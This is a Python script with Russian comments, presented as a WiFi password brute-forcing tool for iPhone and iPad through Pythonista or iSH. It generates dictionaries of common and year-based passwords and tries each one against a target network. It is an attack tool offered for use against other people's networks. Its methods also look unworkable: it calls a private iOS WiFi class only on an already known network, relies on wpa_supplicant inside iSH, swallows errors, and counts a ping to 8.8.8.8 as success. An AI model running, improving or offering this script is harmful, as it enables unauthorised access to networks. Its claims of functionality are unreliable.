#!/usr/bin/env python3
"""
WiFi Bruteforce Script для iOS (iPhone/iPad)
Работает через Pythonista или iSH Shell
Оптимизирован для мобильных устройств
"""

import os
import sys
import time
import re
import threading
import itertools
import string
import subprocess
from queue import Queue
from datetime import datetime

class iOSWiFiBruteforce:
    def __init__(self, target_ssid=None):
        self.target_ssid = target_ssid
        self.interface = self.get_ios_interface()
        self.password_queue = Queue()
        self.found_password = None
        self.stop_flag = False
        self.total_attempts = 0
        self.attempts_done = 0
        self.ios_mode = self.detect_ios_environment()
        
    def detect_ios_environment(self):
        """Определение среды iOS (Pythonista или iSH)"""
        if os.path.exists('/private/var/mobile'):
            print("[+] Обнаружена iOS среда")
            if 'PYTHONIST' in os.environ or os.path.exists('/var/mobile/Library'):
                print("[+] Режим: Pythonista")
                return 'pythonista'
            else:
                print("[+] Режим: iSH Shell")
                return 'ish'
        return 'unknown'
    
    def get_ios_interface(self):
        """Получение интерфейса WiFi на iOS"""
        try:
            # Для iSH - попытка найти интерфейс
            result = subprocess.run(['ifconfig'], capture_output=True, text=True)
            lines = result.stdout.split('\n')
            
            # iOS обычно использует en0 для WiFi
            for line in lines:
                if 'en0' in line and 'inet' in line:
                    print("[+] Найден интерфейс: en0")
                    return 'en0'
                elif 'awdl0' in line:
                    print("[+] Найден интерфейс: awdl0")
                    return 'awdl0'
        except:
            pass
        
        # Альтернативные интерфейсы iOS
        ios_interfaces = ['en0', 'awdl0', 'pdp_ip0']
        for iface in ios_interfaces:
            try:
                result = subprocess.run(['ifconfig', iface], capture_output=True)
                if result.returncode == 0:
                    print(f"[+] Использую интерфейс: {iface}")
                    return iface
            except:
                continue
        
        print("[-] Интерфейс не найден. Используется режим эмуляции")
        return None
    
    def generate_password_dictionary_2026(self):
        """Генерация оптимизированного словаря для iOS"""
        print("[+] Генерация словаря паролей (iOS оптимизированный)...")
        
        # Базовые пароли (сокращенные для мобильных устройств)
        passwords = [
            # Топ-50 самых популярных
            "12345678", "password", "123456789", "12345", "1234567890",
            "qwerty123", "admin123", "admin", "password123", "pass123",
            "11111111", "00000000", "88888888", "12341234", "123123123",
            "wifi1234", "wifi123", "internet", "1q2w3e4r", "1qaz2wsx",
            "zaq12wsx", "abc12345", "letmein", "welcome1", "master123",
            "hello123", "sunshine1", "!@#$%^&*", "qwerty!", "passw0rd",
            "P@ssw0rd", "Admin@123", "password!", "123qwe!@#", "zaq12wsx",
        ]
        
        # Паттерны с 2026
        year_patterns = [
            "2026", "20262026", "pass2026", "2026pass", "admin2026",
            "wifi2026", "2026wifi", "password2026", "user2026", "root2026",
            "2026!", "@2026", "2026@", "#2026", "2026#", "$2026", "2026$"
        ]
        
        # Дата 2026
        current_year = "2026"
        months = [f"{current_year}{m:02d}" for m in range(1, 13)]
        
        # Комбинации
        combos = []
        for base in ["admin", "user", "wifi", "pass"]:
            combos.append(f"{base}{current_year}")
            combos.append(f"{current_year}{base}")
            combos.append(f"{base}{current_year}!")
            combos.append(f"{base.capitalize()}{current_year}")
        
        # Объединение
        all_passwords = passwords + year_patterns + months + combos
        all_passwords = list(set(all_passwords))
        
        print(f"[+] Сгенерировано {len(all_passwords)} паролей")
        return all_passwords
    
    def generate_smart_combinations(self):
        """Умная генерация паролей для iOS"""
        print("[+] Генерация умных комбинаций...")
        combinations = []
        
        # Основные слова
        base_words = ["admin", "user", "test", "wifi", "home", "guest"]
        numbers = ["123", "1234", "2026", "1", "01"]
        symbols = ["!", "@", "#", ""]
        
        # Комбинации
        for word in base_words:
            for num in numbers:
                for sym in symbols:
                    combos = [
                        f"{word}{num}{sym}",
                        f"{word}{sym}{num}",
                        f"{num}{word}{sym}",
                        f"{word.capitalize()}{num}"
                    ]
                    combinations.extend(combos)
        
        # Генерация цифровых последовательностей
        for i in range(1, 100):
            combinations.append(str(i).zfill(8))
            combinations.append(str(i).zfill(4))
        
        combinations = list(set(combinations))
        print(f"[+] Сгенерировано {len(combinations)} комбинаций")
        return combinations
    
    def ios_connection_attempt(self, password):
        """Попытка подключения через iOS API"""
        if self.stop_flag or self.found_password:
            return False
        
        self.attempts_done += 1
        if self.attempts_done % 5 == 0:
            progress = (self.attempts_done / self.total_attempts) * 100
            sys.stdout.write(f"\r[*] Прогресс: {progress:.1f}% ({self.attempts_done}/{self.total_attempts})")
            sys.stdout.flush()
        
        try:
            if self.ios_mode == 'pythonista':
                # Pythonista - использование специальных вызовов
                import objc_util
                from objc_util import *
                
                # Получение WiFi Manager через iOS API
                WiFiManager = ObjCClass('CWFWiFiManager')
                manager = WiFiManager.sharedInstance()
                
                # Попытка подключения
                network = manager.knownNetworks().firstObject()
                if network:
                    result = manager.associateToNetwork_password_error_(network, password, None)
                    if result:
                        self.found_password = password
                        print(f"\n\n[+] ПАРОЛЬ НАЙДЕН: {password}")
                        return True
                        
            elif self.ios_mode == 'ish':
                # iSH - через системные утилиты
                config_file = '/tmp/wifi_config.conf'
                config = f"""network={{
    ssid="{self.target_ssid}"
    psk="{password}"
    key_mgmt=WPA-PSK
}}
"""
                with open(config_file, 'w') as f:
                    f.write(config)
                
                # Использование wpa_supplicant если доступен
                result = subprocess.run(['wpa_supplicant', '-B', '-i', self.interface,
                                        '-c', config_file], capture_output=True, timeout=3)
                
                time.sleep(1)
                
                if result.returncode == 0:
                    # Проверка подключения
                    check = subprocess.run(['ping', '-c', '1', '8.8.8.8'], 
                                          capture_output=True, timeout=2)
                    if check.returncode == 0:
                        self.found_password = password
                        print(f"\n\n[+] ПАРОЛЬ НАЙДЕН: {password}")
                        return True
                
                # Очистка
                subprocess.run(['killall', 'wpa_supplicant'], capture_output=True)
                
        except ImportError:
            # Режим эмуляции (для тестирования)
            if self.attempts_done % 100 == 0:
                print(f"\n[Тест] Попытка: {password}")
        
        except Exception as e:
            pass
        
        return False
    
    def worker(self):
        """Рабочий поток"""
        while not self.stop_flag and not self.found_password:
            try:
                password = self.password_queue.get(timeout=0.5)
                if self.ios_connection_attempt(password):
                    self.stop_flag = True
                    break
                self.password_queue.task_done()
            except:
                continue
    
    def run_bruteforce(self):
        """Запуск брутфорса на iOS"""
        print("\n" + "="*50)
        print("iOS WiFi BRUTEFORCE v3.0 (2026)")
        print("="*50)
        print(f"[+] Устройство: {'iPhone/iPad' if self.ios_mode != 'unknown' else 'Unknown'}")
        print(f"[+] Режим: {self.ios_mode.upper()}")
        print(f"[+] Интерфейс: {self.interface or 'Не найден'}")
        
        # Генерация паролей
        passwords = self.generate_password_dictionary_2026()
        combinations = self.generate_smart_combinations()
        
        # Объединение
        all_passwords = passwords + combinations
        all_passwords = list(set(all_passwords))
        self.total_attempts = len(all_passwords)
        
        print(f"[+] Паролей к проверке: {self.total_attempts}")
        
        if not self.target_ssid:
            self.target_ssid = input("\n[?] Введите SSID WiFi сети: ")
        
        print(f"[+] Цель: {self.target_ssid}")
        
        # Заполнение очереди
        for pwd in all_passwords:
            self.password_queue.put(pwd)
        
        print("\n[!] Запуск атаки...")
        print("[!] Нажмите Ctrl+C для остановки\n")
        
        start_time = time.time()
        
        # Запуск потоков (меньше для iOS)
        threads = []
        num_threads = 2
        
        for _ in range(num_threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        try:
            while not self.stop_flag and self.attempts_done < self.total_attempts:
                time.sleep(0.5)
        except KeyboardInterrupt:
            print("\n\n[!] Прервано пользователем")
            self.stop_flag = True
        
        elapsed = time.time() - start_time
        
        print("\n" + "="*50)
        if self.found_password:
            print(f"[✓] УСПЕХ! Пароль найден: {self.found_password}")
            print(f"[✓] Время: {elapsed:.1f} сек")
            print(f"[✓] Попыток: {self.attempts_done}")
            print(f"\n[!] Подключитесь вручную через Настройки > Wi-Fi")
            print(f"[!] Пароль: {self.found_password}")
        else:
            print("[✗] НЕУДАЧА: Пароль не найден")
            print("[!] Рекомендации:")
            print("  1. Убедитесь, что сеть WPA/WPA2 защищена")
            print("  2. Попробуйте более сложные пароли вручную")
            print("  3. Используйте WPS если доступно")
        
        print("="*50)

def main():
    # Проверка iOS
    if sys.platform == 'darwin':
        print("""
    ╔════════════════════════════════════════╗
    ║    iOS WiFi BRUTEFORCE TOOL 2026      ║
    ║    Для Pythonista / iSH Shell         ║
    ╚════════════════════════════════════════╝
        """)
        
        # Предупреждение
        print("[!] ВНИМАНИЕ: На iOS требуются специальные разрешения")
        print("[!] Для Pythonista: нужны разрешения в настройках")
        print("[!] Для iSH: требуется установка дополнительных пакетов")
        print()
        
        wifi = iOSWiFiBruteforce()
        
        # Меню
        print("1. Брутфорс с указанием SSID")
        print("2. Сканирование сетей (iOS)")
        print("3. Тестовый режим (эмуляция)")
        
        choice = input("\nВыбор: ")
        
        if choice == "2":
            print("\n[+] Для сканирования используйте:")
            print("  - Pythonista: установите модуль WiFi")
            print("  - iSH: используйте 'airport -s' если доступно")
            print("\n[?] Введите SSID вручную:")
            wifi.target_ssid = input("SSID: ")
        elif choice == "3":
            print("[+] Тестовый режим (без реального подключения)")
        
        wifi.run_bruteforce()
        
    else:
        print("[-] Этот скрипт оптимизирован для iOS")
        print("[-] Запустите на iPhone/iPad через Pythonista или iSH")

if __name__ == "__main__":
    main()
